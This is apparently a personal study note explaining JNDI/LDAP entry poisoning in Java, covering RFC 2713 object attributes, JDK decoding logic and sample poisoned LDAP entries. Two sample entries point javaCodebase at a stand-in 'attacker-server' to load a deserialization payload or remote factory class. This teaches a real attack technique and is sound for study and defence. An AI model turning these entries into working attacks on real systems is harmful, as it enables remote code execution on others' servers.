---
title: "JNDI - LDAP Attack Vector (Entry Poisoning)"
created: 2022-05-28T00:37:51.097-05:00
modified: 2022-05-28T01:14:07.244-05:00
parent: "[[Java Naming and Directory Interface (JNDI)]]"
children: []
---
[[Light-Weight／Lightwieght Directory Access Protocol (LDAP)|LDAP]] can be used to store Java objects by using several special Java attributes

There are at least three ways a Java object can be stored in an LDAP directory:
- Using Java Serialization
- Using JNDI References
- Using Remote Locations (deprecated?)

The decoding of these objects by the <code><font style="color: rgb(122,134,154);">javax.naming.spi.NamingManager</font></code> will result in remote code execution
# Lookup (Naming) vs Search (Directory)
- Directory Services allow the assignment of Attributes to stored Entries.
- Lookup operations are allowed but not widely used.
- Search operations that request Entry attributes are the normal way to query Directories:

Example search operation:
```
Search(“uid=john,ou=People,dc=example,dc=org”)
```

Example search response (list of attributes):
```
ObjectClass: inetOrgPerson
UID: john
Name: John Smith
Email Address: john@acme.com
Location: Vegas, NV
```

If the search was conducted requesting that the entry's object be returned (i.e. <code><font style="color: rgb(122,134,154);">SearchControls.setReturningObjFlag()</font></code> was invoked with <code><font style="color: rgb(122,134,154);">true</font></code>):
- then <code><font style="color: rgb(122,134,154);">javax.naming.directory.SearchResult</font></code> will contain an object that represents the entry

If a <code><font style="color: rgb(122,134,154);">java.io.Serializable</font></code>, <code><font style="color: rgb(122,134,154);">Referenceable</font></code>, or <code><font style="color: rgb(122,134,154);">Reference</font></code> object was previously bound to that LDAP name:
- then the attributes from the entry are used to reconstruct that object

Otherwise:
- the attributes from the entry are used to create a <code><font style="color: rgb(122,134,154);">javax.naming.directory.DirContext</font></code> instance that represents the LDAP entry

# Java Object Decoding

Let's look into <font style="color: rgb(122,134,154);">com.sun.jndi.ldap.Ldap{Search|Binding}Enumeration</font>
```
// only generate object when requested
if (searchArgs.cons.getReturningObjFlag()) {
    if (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != null) {
        // Entry contains Java-object attributes (ser/ref object)
        // serialized object or object reference
        obj = Obj.decodeObject(attrs);
    }
    if (obj == null) {
        obj = new LdapCtx(homeCtx, dn);
    }
    …
}
```
# Java Schema (RFC 2713)

RFC 2713 defines different representations for Java objects so that they can be stored in a Directory Service:
- <strong>Serialized Objects (javaSerializedObject)</strong> - a serialized object is represented in the directory by the attributes:
	- <code><font style="color: rgb(122,134,154);">javaClassName</font></code>
	- <code><font style="color: rgb(122,134,154);">javaClassNames</font></code>
	- <code><font style="color: rgb(122,134,154);">javaCodebase</font></code>
	- <code><font style="color: rgb(122,134,154);">javaSerializedData</font></code>
- <strong>JNDI References (javaNamingReference)</strong> - contains information to assist in the creation of an instance of the object to which the reference refers
	- <code><font style="color: rgb(122,134,154);">javaClassName</font></code>
	- <code><font style="color: rgb(122,134,154);">javaClassNames</font></code>
	- <code><font style="color: rgb(122,134,154);">javaCodebase</font></code>
	- <code><font style="color: rgb(122,134,154);">javaReferenceAddress</font></code>
	- <code><font style="color: rgb(122,134,154);">javaFactory</font></code>
- <strong>Marshalled Objects (javaMarshalledObject)</strong> - marshalling is like serialization, except marshalling also records codebases
	- <code><font style="color: rgb(122,134,154);">javaClassName</font></code>
	- <code><font style="color: rgb(122,134,154);">javaClassNames</font></code>
	- <code><font style="color: rgb(122,134,154);">javaSerializedData</font></code>
- <strong>Remote Location (Deprecated)</strong> - Store location of remote RMI objects
	- <code><font style="color: rgb(122,134,154);">javaClassName</font></code>
	- <code><font style="color: rgb(122,134,154);">javaRemoteLocation</font></code>

# Entry Poisoning with Serialized Objects

Place payload in <code><font style="color: rgb(122,134,154);">javaSerializedData</font></code> attribute
```
ObjectClass: inetOrgPerson
UID: john
Name: John Smith
Email Address: john@example.org
Location: Vegas, NV
javaSerializedData: ACED01A43C4432FEEA1489AB89EF11183E499…
javaCodebase: http://attacker-server/
javaClassName: DeserializationPayload
```

If <code><font style="color: rgb(122,134,154);">com.sun.jndi.ldap.object.trustURLCodebase</font></code> is <code><font style="color: rgb(122,134,154);">true</font></code>
- attackers can provide their own classes

else
- attackers will be able to use available classes in the <code><font style="color: rgb(122,134,154);">CLASSPATH</font></code>

# Entry Poisoning with JNDI References

Use JNDI Reference using remote factory class:
- <code><font style="color: rgb(122,134,154);">javaClassName</font></code> - name of referenced object class
- <code><font style="color: rgb(122,134,154);">javaFactory</font></code> - name of Factory class
- <code><font style="color: rgb(122,134,154);">javaCodebase</font></code> - location of Factory class
```
ObjectClass: inetOrgPerson, javaNamingReference
UID: john
Name: John Smith
Email Address: john@example.org
Location: Vegas, NV
javaCodebase: http://attacker-server/
JavaFactory: Factory
javaClassName: MyClass
```
